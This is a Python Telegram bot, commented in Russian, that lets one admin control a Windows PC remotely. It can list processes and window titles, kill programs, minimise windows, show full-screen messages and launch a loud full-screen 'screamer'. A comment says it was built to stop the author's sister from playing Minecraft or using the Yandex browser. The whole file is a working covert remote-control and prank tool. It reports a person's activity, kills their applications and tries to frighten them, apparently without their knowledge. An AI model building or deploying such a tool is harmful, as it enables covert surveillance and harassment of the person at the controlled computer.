import telebot
import psutil
import pygetwindow as gw
from PIL import Image, ImageTk, ImageDraw, ImageFont
import tkinter as tk
import screeninfo
from playsound import playsound
import time
import pygame

TOKEN = 'токен'
bot = telebot.TeleBot(TOKEN)

image_path = "scrimer.jpg"

# Путь к Вашему звуковому файлу
sound_path = "sound.mp3"

AdminId = #Тут id Админа

def create_inline_button(pid, name):
    return telebot.types.InlineKeyboardButton(name, callback_data=str(pid))

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if str(message.chat.id) != str(AdminId):
        bot.send_message(message.chat.id, 'Доступ запрещен')
    else:
        bot.send_message(AdminId, 'Доступ разрешен')

        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = telebot.types.KeyboardButton("Закрыть программы которые часто использует варя(Яндекс,Маинкрафт)")#Эту кнопку я создал специально для сестры, чтобы она не могла играть в «Майнкрафт» и сидеть в Яндексе.УХАХАХАХААХАХХАХАХ
        btn2 = telebot.types.KeyboardButton("Какие программы работают")
        btn3 = telebot.types.KeyboardButton("Какие окна открыты")
        btn4 = telebot.types.KeyboardButton("Свернуть все окна")
        btn5 = telebot.types.KeyboardButton("Запустить Скриммер")
        btn6 = telebot.types.KeyboardButton("Передать сообщение")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
        bot.send_message(AdminId, text="Нажмите кнопку для закрытия всех программ", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "Передать сообщение")
def send_message(message):
    bot.send_message(AdminId, "Какое сообщение Вы хотите передать?")
    @bot.message_handler(content_types=['text'])
    def display_message(message):
        # Создание окна tkinter
        root = tk.Tk()
        root.attributes("-fullscreen", True)

        # Создание изображения с текстом
        image = Image.new("RGB", (1920, 1080), (255, 0, 0))
        draw = ImageDraw.Draw(image)
        font = ImageFont.truetype("arial.ttf", size=100)
        draw.text((100, 100), message.text, font=font, fill=(255, 255, 255))

        # Конвертация изображения в формат, доступный для tkinter
        image_tk = ImageTk.PhotoImage(image)

        # Создание виджета Label для отображения изображения
        label = tk.Label(root, image=image_tk)
        label.pack(fill="both", expand=True)

        # Отображение окна в течение 10 секунд
        bot.send_message(AdminId, 'Подождите пожалуйста 5 секунд, ни чего не нажимайте!Я дам вам знать когда можно давать команды')
        label.after(5000, root.destroy)

        root.mainloop()
        bot.send_message(AdminId, 'Теперь вы можете давать команды')

@bot.message_handler(func=lambda message: message.text == "Закрыть программы которые часто использует варя(Яндекс,Маинкрафт)")
def close_specific_processes(message):
    processes_to_stop = ['javaw.exe', 'browser.exe']

    for process in psutil.process_iter():
        try:
            if process.name() in processes_to_stop:
                process.kill()
                print(f"Процесс {process.pid} ({process.name()}) был остановлен.")
        except (psutil.NoSuchProcess, psutil.ZombieProcess) as e:
            print(f"Ошибка при остановке процесса: {e}")

@bot.message_handler(func=lambda message: message.text == "Какие окна открыты")
def get_running_windows(message):
    running_windows = gw.getWindowsWithTitle('')
    keyboard = telebot.types.InlineKeyboardMarkup()
    for window in running_windows:
        try:
            button = create_inline_button(1, window.title)  
            keyboard.add(button)
        except psutil.NoSuchProcess:
            pass

    bot.send_message(AdminId, 'Выберите окно для закрытия:', reply_markup=keyboard)

@bot.message_handler(func=lambda message: message.text == "Свернуть все окна")
def get_running_windows(message):
    running_windows = gw.getAllTitles()

    for window_title in running_windows:
        window = gw.getWindowsWithTitle(window_title)
        if window:
            window[0].minimize()

@bot.message_handler(func=lambda message: message.text == "Запустить Скриммер")
def get_running_windows(message):
    # Создание главного окна tkinter
    root = tk.Tk()
    pygame.mixer.init()

    # Получение размеров экрана
    screen_info = screeninfo.get_monitors()
    screen_width = screen_info[0].width
    screen_height = screen_info[0].height

    # Загрузка и изменение размера картинки
    image = Image.open(image_path)
    image = image.resize((screen_width, screen_height))

    # Конвертация картинки в формат, доступный для отображения в tkinter
    image_tk = ImageTk.PhotoImage(image)

    # Создание полноэкранного окна tkinter
    root.attributes("-fullscreen", True)

    # Создание виджета Label для отображения картинки в окне
    label = tk.Label(root, image=image_tk)
    label.pack(fill="both", expand=True)

    # Воспроизведение звука на полную громкость
    volume = 1.0
    pygame.mixer.music.load(sound_path)
    pygame.mixer.music.play(-1)
    label.after(4000, lambda: [pygame.mixer.music.stop(), root.destroy()])
    root.attributes("-alpha", volume)

    bot.send_message(AdminId, 'Подождите пожалуйста 4 секунд, ни чего не нажимайте!Я дам вам знать когда можно давать команды')
    label.after(10000, root.destroy)
    
    root.mainloop()
    bot.send_message(AdminId, 'Теперь вы можете давать команды')

@bot.message_handler(func=lambda message: message.text == "Какие программы работают")
def get_running_processes(message):
    running_processes = [p.info for p in psutil.process_iter(attrs=['pid', 'name'])]
    keyboard = telebot.types.InlineKeyboardMarkup()
    for proc in running_processes:
        try:
            button = create_inline_button(proc['pid'], f"{proc['name']} (PID: {proc['pid']})")
            keyboard.add(button)
        except psutil.NoSuchProcess:
            pass

    bot.send_message(AdminId, 'Выберите программу для закрытия:', reply_markup=keyboard)

bot.polling()